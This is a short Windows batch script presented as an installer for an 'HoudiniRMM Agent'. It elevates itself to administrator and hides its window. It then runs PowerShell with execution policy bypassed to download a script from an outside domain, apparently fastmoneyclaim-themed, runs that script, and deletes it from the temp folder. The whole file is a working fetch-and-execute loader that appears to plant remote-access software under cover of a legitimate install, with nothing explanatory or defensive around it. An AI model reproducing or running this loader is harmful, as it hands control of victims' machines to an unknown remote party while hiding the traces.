@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)
echo Installing HoudiniRMM Agent...
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -UseBasicParsing 'https://rmm.houdini.fastmoneyclaim.com/dashboard/api/install-script' -OutFile $env:TEMP\install.ps1; & $env:TEMP\install.ps1 }"
timeout /t 5 /nobreak >nul 2>&1
if exist "%TEMP%\install.ps1" del /q "%TEMP%\install.ps1" 2>nul
echo Done.
pause